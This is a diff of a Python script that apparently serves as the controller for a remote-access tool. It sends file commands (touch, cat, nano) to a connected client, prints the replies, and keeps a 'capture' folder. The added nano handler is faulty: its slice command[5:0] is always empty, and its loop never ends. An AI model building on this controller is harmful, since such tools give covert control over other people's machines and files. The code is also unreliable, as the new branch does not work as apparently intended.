@@ -14,7 +14,7 @@ def info_receive_client(conn):
     """)
 
 def create_folder():
-    path = '/capture'
+    path = 'capture'
     if not os.path.exists(path):
         os.makedirs(path)
         print("[+] Folder was created.")
@@ -54,6 +54,14 @@ if __name__ == '__main__':
             elif command.startswith('touch'):
                 recv_touch = conn.recv(4096).decode()
                 print(recv_touch)
+            elif command.startswith('cat'):
+                recv_cat = conn.recv(4096).decode()
+                print(recv_cat)
+            elif command.startswith('nano'):
+                command_edit = command[5:0]####
+                while True:####
+                    content_file = input(f'{command_edit}>> ')####
+                    conn.send(content_file.encode())####
             else:
                 recv = conn.recv(4096).decode()
                 print(recv)
